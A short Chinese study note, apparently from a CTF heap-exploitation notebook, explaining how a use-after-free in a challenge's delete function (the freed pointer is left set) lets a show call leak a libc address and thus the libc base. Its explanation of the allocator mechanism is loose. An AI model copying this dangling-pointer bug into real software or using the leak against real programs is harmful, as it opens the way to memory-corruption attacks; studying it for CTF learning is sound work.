## 用途
通过这个漏洞，我们可以获得我们的 libc 的基地址。

## 条件
```cpp
int delete(){
	int idx=0;
	printf("idx?");
	cin>>idx;
	if(idx<0||idx>=0x010||!ptr[idx]){
		puts("no such chunk!");
		return 0;
		} 
	free(ptr[idx]);
	// ptr[idx]=0;
	//ptr_size[idx]=0; %%
}
```

## 原理
这个漏洞利用了我们的堆管理器中的内存复用计数，当我们释放一个大内存后，如果我们新调用一个小内存，那么我们这个小内存的地址就和我们的大内存的地址是相同的。
![[Pasted image 20231212221529.png]]

## 方法：
```cpp
create(0,0x500)
create(1,0x10);
delete(0);
```

这个时候，因为我们的删除函数并没有清空 0 对应的指针，导致之后我们还可以利用这一个指针，如果这个时候，我们要 show 对应的内容，我们就可以获得我们的对应某个 libc地址
```cpp
show(0);
```

然后我们在通过计算这个位置和我们的 libc 基址的偏移量，就能确定我们的 libc 基地址。